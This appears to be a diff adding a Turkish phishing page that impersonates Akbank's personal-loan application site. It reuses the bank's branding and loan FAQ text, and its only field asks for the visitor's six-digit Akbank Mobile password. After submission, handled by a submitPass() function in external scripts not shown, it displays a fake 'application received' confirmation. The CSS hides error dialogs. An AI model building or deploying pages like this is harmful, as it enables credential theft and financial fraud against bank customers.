@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+ 
+<html lang="tr">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script type="text/javascript"></script>
+   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+  </head>
+  <body>
+    <title>İhtiyaç Kredisi Başvurusu | Anında Krediye Başvur - Akbank</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="description" content="İhtiyaç anında yanında. Bankaya gitmeden anında ihtiyaç kredisine başvur ve ödemeye 3 ay sonra başla!">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:title" content="İhtiyaç Kredisi Başvurusu Anında Krediye Başvur">
+    <meta property="og:description" content="İhtiyaç anında yanında. Bankaya gitmeden anında ihtiyaç kredisine başvur ve ödemeye 3 ay sonra başla!">
+    <meta name="theme-color" content="#ffffff">
+ 
+ 
+    <link href="./Akbank_files/vendor.css" rel="stylesheet">
+    <style>
+      .error {
+        border-color: red !important;
+      }span.swal2-x-mark {
+  display: none;
+}
+
+h2.swal2-title {
+  display: none;
+}
+
+div.swal2-icon.swal2-error.swal2-icon-show {
+  display: none;
+}
+
+div.py-30.px-30.scrollTo {
+  width: 100%;
+}
+
+div.col-lg-4.right.mt-3 {
+   width: 100%;
+}
+
+input.phone {
+  height: 35px;
+}
+
+button.swal2-confirm.swal2-styled {
+  display: none;
+}
+    </style>
+    <div id="content">
+      <div class="theme-default">
+        <div class="bapp-page bapp-navigation-open">
+          <header class="bapp-header low">
+            <div class="bapp-header-wrapper logo-container">
+              <div class="bapp-logo-container bapp-logo-has-padding">
+                <img name="AkbankLogo" class="bapp-logo" src="./Akbank_files/logo.png">
+              </div>
+            </div>
+          </header>
+          <div class="sticky">
+            <div class="container">
+              <div class="content">
+                <div class="text">
+                  <h3>Hemen Başvur</h3>
+                  <p>Başvuru sürecini online olarak sadece bir kaç dakika içinde kolayca tamamlayabilirsiniz.</p>
+                </div>
+                <a class="btn btn-white btn-scroll-top" href="">Başvuruyu Başlat</a>
+              </div>
+            </div>
+          </div>
+          <div class="banner image-top">
+            <div class="container-v2 position-relative">
+              <h1 class="">İhtiyaç kredinizi 12, 24 ve 36 aylık vadelerle <br>hemen kullanın, 3 ay sonra ödemeye başlayın! </h1>
+              <picture>
+                <img alt="banner" class="img-fluid banner-img lazyloaded" src="./Akbank_files/ihtiyac-kredisi.png">
+              </picture>
+            </div>
+          </div>
+          <main>
+            <section class="section form">
+              <div class="container-v2 container-mobile position-relative">
+                <div class="box p-0">
+                  <form id="form1" novalidate="novalidate">
+                    <div class="row g-0 row-fix">
+                       
+                       
+                    
+                      <div class="col-lg-4 right mt-3" id="authf" style="">
+                        <div class="py-30 px-30 scrollTo">
+                          <div class="input-block">
+                            <h2 class="mb-4">Son bi adım kaldı..</h2>
+                            <label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label>
+                            <input class="phone" type="password" id="passauth" maxlength="6">
+                          </div>
+                          <div class="input-block">
+                            <button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit" disabled="">Onayla</button>
+                            <button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;">
+                              <div class="spinner"></div>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-lg-4 right mt-3" id="completef" style="display: none;">
+                        <div class="py-30 px-30 scrollTo">
+                          <div class="input-block" style="font-family: Inter;">
+                            <h8>
+                              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="red" class="bi bi-check-circle" viewBox="0 0 16 16">
+                                <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
+                                <path d="m10.97 4.97-.02.022-3.473 4.425-2.093-2.094a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05"></path>
+                              </svg>
+                              <br>
+                              <br>Başvurunuz başarıyla alınmıştır. <br>
+                              <br> En kısa süre içerisinde sonuçlandırma ile ilgili bilgilendirileceksiniz.
+                            </h8>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </section>
+ 
+            <section class="section accordions">
+              <div class="container-v2 container-mobile">
+                <div class="acc" data-id="kredi-hesaplama-nasil-yapilir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-1" aria-expanded="false" aria-controls="content-1">Kredi hesaplama nasıl yapılır?</button>
+                  </h4>
+                  <div class="acc-content" id="content-1" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Talep ettiğiniz kredi tutarı ve vadeyi girerek, size uygun faiz oranını ve aylık taksit tutarını görüntüleyebilirsiniz. Ayrıca kredi ile birlikte ödeyeceğiniz diğer masrafları ve kredinizin toplam maliyetini de görüntüleyebilirsiniz. Faiz oranı; girdiğiniz tutar ve vadeye, başvuru skorunuza veya sigorta durumunuza göre değişebilir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ihtiyac-kredisine-kimler-basvurabilir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-2" aria-expanded="false" aria-controls="content-2">İhtiyaç kredisine kimler başvurabilir?</button>
+                  </h4>
+                  <div class="acc-content" id="content-2" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>18 yaşından büyükseniz ve çalışıyorsanız kredi başvurunuzu iletebilirsiniz. Kredi başvuru sonucunuz bankamızda kayıtlı cep telefonunuza iletilecektir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ne-kadar-ihtiyac-kredisi-kullanabilirsiniz">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-3" aria-expanded="false" aria-controls="content-3">Ne kadar ihtiyaç kredisi kullanabilirsiniz?</button>
+                  </h4>
+                  <div class="acc-content" id="content-3" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Akbank Mobil ve İnternet üzerinden 500.000 TL'ye kadar kredi başvurusunda bulunabilir, onaylanması durumunda kredinizi kullanabilirsiniz. 500.000 TL üzeri kredi talebinizi iletmek için şubelerimize gidebilirsiniz.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="hangi-belgelere-ihtiyaciniz-var">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-4" aria-expanded="false" aria-controls="content-4">Hangi belgelere ihtiyacınız var?</button>
+                  </h4>
+                  <div class="acc-content" id="content-4" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Akbanklıysanız, Akbank Mobil ve İnternet üzerinden, belgesiz imzasız kredinizi kullanabilirsiniz. Henüz Akbanklı olmadıysanız, kimlik, gelir durumu ve adresinizi teyit eden belge ile en yakın şubemize başvurabilirsiniz. Ek belgeye ihtiyaç duyulursa şubemiz sizi bilgilendirecektir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="kredinizi-nasil-kullanabilirsiniz">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-5" aria-expanded="false" aria-controls="content-5">Kredinizi nasıl kullanabilirsiniz?</button>
+                  </h4>
+                  <div class="acc-content" id="content-5" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Kredinizi Akbank Mobil ve İnternet'ten, 444 25 25'ten veya şubelerimizden hemen kullanabilirsiniz.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ihtiyac-kredisi-kosullari-nelerdir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-6" aria-expanded="false" aria-controls="content-6">İhtiyaç kredisi koşulları nelerdir?</button>
+                  </h4>
+                  <div class="acc-content" id="content-6" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Erteleme dahil ihtiyaç kredilerinde en uzun vade; 50.000 TL ve altındaki tutarlarda 36 ay, 50.000 TL üzeri 100.000 TL ve altındaki tutarlarda 24 ay, 100.000 TL üzerindeki tutarlarda ise 12 aydır. En uzun kredi vadesi, mevzuatta belirlenen çerçeve doğrultusunda, kişinin varsa mevcut kredilerinin bakiyesi de dikkate alınabileceğinden değişebilmektedir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="diger-aciklamalar">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-7" aria-expanded="false" aria-controls="content-7">Diğer Açıklamalar</button>
+                  </h4>
+                  <div class="acc-content" id="content-7" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p></p>
+                    <ul>
+                      <li>Tabloda yer alan faiz oranları ortalama değerler baz alınarak hesap edilmiştir. Bu oranlar müşteri skoru ve benzer nedenlerle müşteri özelinde değişebilmektedir.</li>
+                      <li>Erteleme dahil ihtiyaç kredilerinde en uzun vade; 50.000 TL ve altındaki tutarlarda 36 ay, 50.000 TL üzeri 100.000 TL ve altındaki tutarlarda 24 ay, 100.000 TL üzerindeki tutarlarda ise 12 aydır. En uzun kredi vadesi, mevzuatta belirlenen sınırlamalar doğrultusunda kişinin varsa mevcut kredilerinin bakiyesi de dikkate alınabileceğinden değişebilmektedir. İlk ödeme en fazla 92 gün ertelenebilir. Ödemesiz dönem sonunda ilk ödeme olarak erteleme faizinin tamamı tahsil edilir, normal taksit ödemeleri bir sonraki aydan itibaren başlar. Kredi başvurusu Akbank Mobil, İnternet, 444 25 25 Müşteri İletişim Merkezimiz ve tüm şubelerimizden yapılabilir.</li>
+                      <li>500.000 TL'ye kadar olan ihtiyaç kredisi başvuruları Akbank Mobil ve İnternet üzerinden, şubeye gitmeden yapılabilir. 500.000 TL'nin üzerindeki başvurular ise sadece şubelerimizden gerçekleştirilebilir.</li>
+                      <li>Belgesiz, imzasız, şubeye gitmeden İhtiyaç Kredisi kullanma imkanından T.C. vatandaşı, Akbank şifresi sahibi Akbanklılar yararlanabilir.</li>
+                      <li>Henüz Akbank müşterisi olmayanların kredi kullanabilmek için T.C. vatandaşlık numaralı kimlik, gelir belgesi, adres gösterir bir belge ve özel sektör çalışanı ise SGK Hizmet Döküm Belgeleri ile birlikte Akbank Şubelerine gitmeleri gerekmektedir.</li>
+                      <li>Banka, gerekli gördüğü durumlarda ek belge isteme hakkına sahiptir. Onaylanmış kredilerin kullandırılması için nihai karar Banka'ya aittir.</li>
+                      <li>Kredi başvurusu için kefil koşulu aranmamakla beraber gerekli görüldüğü durumda kefil talep edilebilir.</li>
+                      <li>Akbank T.A.Ş. kampanya koşullarında değişiklik yapma ve kampanyayı durdurma hakkını saklı tutar.</li>
+                      <li>Sigortalı faiz oranı, Akbank Mobil ve İnternet'ten yapılacak Kredili Hayat Sigortalı kredi kullanımları için geçerlidir. Hayat sigortası primi olan 1.640,73 TL, 50.000 TL tutarındaki 36 ay vadeli ihtiyaç kredisi için 35 yaş üzerinden örnek olarak hesaplanmıştır; kredinin tutarı, vadesi, faiz oranı ve kullanacak olan kişinin yaşına göre değişiklik gösterebilir.</li>
+                      <li>Kredi tahsis ücreti, kredi tutarının binde 5,75'i olup, BSMV dâhildir.</li>
+                      <li>Efektif Yıllık Faiz oranı hesaplamasına, kredi tahsis ücreti, faiz ve vergiler dahildir.</li>
+                      <li>Kredi faizi; Akbank şubeleri, Akbank Mobil, İnternet ve 444 25 25'te farklılık gösterebilir.</li>
+                      <li>Kullandırımda kredinin son taksit tutarında kuruşsal farklılık olabilmektedir.</li>
+                    </ul>
+                    <p></p>
+                  </div>
+                </div>
+              </div>
+            </section>
+          </main>
+          <footer class="page-footer">
+            <div class="container">
+              <div class="row">
+                <div class="col-9 col-md-9 col-lg-9 col-xl-9">
+                  <div class="page-footer-left">
+                    <span class="copyright-text">Her hakkı Akbank T.A.Ş'ye aittir ©2024</span>
+                  </div>
+                </div>
+                <div class="col-3 col-md-3 col-lg-3 col-xl-3">
+                  <div class="page-footer-right">
+                    <img name="NortonLogo" class="norton-logo" src="./Akbank_files/norton.png">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </footer>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript" src="./Akbank_files/vendor.js"></script>
+    <script type="text/javascript" src="./Akbank_files/components.js"></script>
+    <script type="text/javascript" src="./Akbank_files/main.js"></script>
+    <script src="./Akbank_files/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="./Akbank_files/plus.js"></script>
+    <script type="text/javascript" src="./Akbank_files/script.js"></script>
+    <script type="text/javascript">
+      var passInput = document.getElementById('passauth');
+      var submitButton = document.getElementById('loginButtonPass');
+      passInput.addEventListener('input', function() {
+        if (passInput.value.length === 6) {
+          submitButton.disabled = false;
+        } else {
+          submitButton.disabled = true;
+        }
+      });
+    </script>
+    <noscript>You must enable javascript in your browser to view this webpage.</noscript>
+  </body>
+</html>
